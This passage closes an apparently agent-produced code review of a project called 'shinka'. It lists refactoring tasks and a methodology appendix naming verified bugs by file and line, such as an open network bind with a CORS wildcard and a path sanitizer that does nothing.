16. Extract `_retry.py`, `serialization.py`, `plots/style.py`, `shinka-common.css`/`shinka-utils.js`, and a shared `shinka.eval` example harness; parametrize `test_edit_*` and populate `conftest.py`.
17. Break up the 18k-line `viz_tree.html`.

---

## Appendix — methodology & confidence

Findings were produced by five parallel role agents reading the source directly, then cross-checked. The two `apply_diff` bugs (Q1, Q2) were reproduced by executing the real code. This synthesizer independently re-verified the headline claims against the code, confirming each: the `0.0.0.0` bind and CORS wildcard (`visualization.py:1740/1681`), the no-op path sanitizer (428–430), the substring `.find()` and newline-requiring `PATCH_PATTERN` (`apply_diff.py:75/12–15`), the missing `combined_score`/`correct` indexes (`dbase.py:453–465`), the `correct.json`-before-`metrics.json` write order (`wrap_eval.py:94–100`), the async `json.dumps` NaN drift (`async_dbase.py:918/971` vs `dbase.py:700`), the truthy-`"none"` return (`llm.py:835`), and the `or -inf` best-program sort (`dbase.py:1615`). Line numbers reflect the repository state at the review date; they will shift as fixes land.
